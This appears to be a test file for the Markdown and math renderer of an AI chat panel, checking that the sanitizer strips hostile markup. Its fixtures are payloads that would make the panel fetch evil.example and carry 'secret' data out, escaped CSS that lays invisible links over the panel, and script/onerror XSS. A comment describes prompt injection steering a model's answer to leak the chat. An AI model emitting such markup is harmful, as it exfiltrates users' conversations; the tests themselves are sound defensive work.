import { describe, expect, it } from 'vitest';
import { renderMarkdownFragment } from '@/lib/render';

/** What the panel inserts, as HTML. */
function renderMarkdown(src: string): string {
  const box = document.createElement('div');
  box.append(renderMarkdownFragment(src));
  return box.innerHTML;
}

describe('renderMarkdown', () => {
  it('renders inline and display math with KaTeX', () => {
    const html = renderMarkdown('Energy $E = mc^2$ and $$\\int_0^1 x\\,dx$$');
    expect(html).toContain('class="katex"');
    expect(html).toContain('katex-display');
    expect(html).not.toContain('$E');
  });

  it('renders chemistry with mhchem', () => {
    const html = renderMarkdown('$\\ce{2H2 + O2 -> 2H2O}$');
    expect(html).toContain('class="katex"');
    expect(html).toContain('H');
  });

  it('keeps underscores inside math out of Markdown emphasis', () => {
    const html = renderMarkdown('$a_1 + a_2$ and $b_1$');
    expect(html).not.toContain('<em>');
  });

  it('sanitizes script tags and event handlers', () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)"><script>alert(2)</script>**bold**');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<script');
    expect(html).toContain('<strong>bold</strong>');
  });
});

describe('model output hardening', () => {
  it('never renders remote images, which could carry data out', () => {
    const html = renderMarkdown('See ![chart](https://evil.example/leak?q=secret) and <img src="https://evil.example/x">');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.example/x');
  });

  // A page can plant instructions for the model (prompt injection); an answer
  // that makes the panel fetch a URL would carry the chat out with no click.
  it.each([
    ['a CSS background', '<span style="background:url(https://evil.example/a?q=secret)">x</span>'],
    ['a CSS image-set', `<div style="background-image:image-set('https://evil.example/b' 1x)">x</div>`],
    ['a cursor', '<div style="cursor:url(https://evil.example/c), auto">x</div>'],
    ['a list marker', '<ul style="list-style:url(https://evil.example/d)"><li>x</li></ul>'],
    ['a background attribute', '<table background="https://evil.example/e"><tr><td>x</td></tr></table>'],
    ['an SVG image', '<svg><image href="https://evil.example/f" /></svg>'],
    ['an SVG use', '<svg><use href="https://evil.example/g#x" /></svg>'],
    ['an SVG filter image', '<svg><filter><feImage href="https://evil.example/h" /></filter></svg>'],
    ['an SVG paint server', '<svg><rect fill="url(https://evil.example/l.svg#p)" filter="url(https://evil.example/m)" mask="u\\72 l(https://evil.example/n)" /></svg>'],
    ['a MathML glyph', '<math><mglyph src="https://evil.example/i" /></math>'],
    ['an embedded object', '<object data="https://evil.example/j"></object><embed src="https://evil.example/k">'],
  ])('fetches nothing through %s', (_what, answer) => {
    expect(renderMarkdown(answer)).not.toContain('evil.example');
  });

  it('keeps an answer inside its own box: no fixed layers over the panel, no pings on links', () => {
    const html = renderMarkdown('<div style="position:fixed;inset:0;z-index:9">x</div><a ping="https://evil.example/p" href="https://example.com">y</a>');
    expect(html).not.toMatch(/position\s*:\s*fixed/);
    expect(html).not.toContain('ping=');
    expect(html).toContain('href="https://example.com"');
  });

  // Each of these computes to position: fixed in WebKit; the browser's own parser reads them, and only KaTeX's styles are kept.
  it.each([
    ['a comment', 'position:/**/fixed;inset:0;opacity:0'],
    ['an escaped value', 'position:\\66 ixed;inset:0'],
    ['an escaped name', 'p\\osition:fixed;inset:0'],
  ])('lays no invisible link over the panel through %s', (_what, style) => {
    const html = renderMarkdown(`<a href="https://evil.example/" style="${style}">x</a>`);
    expect(html).not.toMatch(/position|fixed|inset|opacity/);
  });

  it('keeps only what KaTeX writes in a style', () => {
    const html = renderMarkdown('<span style="color:red;position:relative;top:1px;z-index:9;transform:scale(9)">x</span>');
    expect(html).toContain('color:');
    expect(html).toContain('position:relative');
    expect(html).not.toMatch(/z-index|transform/);
  });

  it('keeps KaTeX’s own styles', () => {
    const html = renderMarkdown('$$\\frac{a}{b}$$');
    expect(html).toContain('style="height:');
  });

  it('opens links in a new tab so the panel is never navigated away', () => {
    const html = renderMarkdown('[docs](https://example.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('leaves no link in SVG or MathML, which would be followed in place, past the link handler', () => {
    const svg = renderMarkdown('<svg width="2000" height="2000"><a href="https://evil.example/"><rect width="100%" height="100%"/></a></svg>');
    expect(svg).toContain('<rect');
    expect(svg).not.toContain('evil.example');
    const xlink = renderMarkdown('<svg><a xlink:href="https://evil.example/"><text>x</text></a></svg>');
    expect(xlink).not.toContain('evil.example');
    const math = renderMarkdown('<math><mi href="https://evil.example/">x</mi></math>');
    expect(math).not.toContain('evil.example');
  });
});
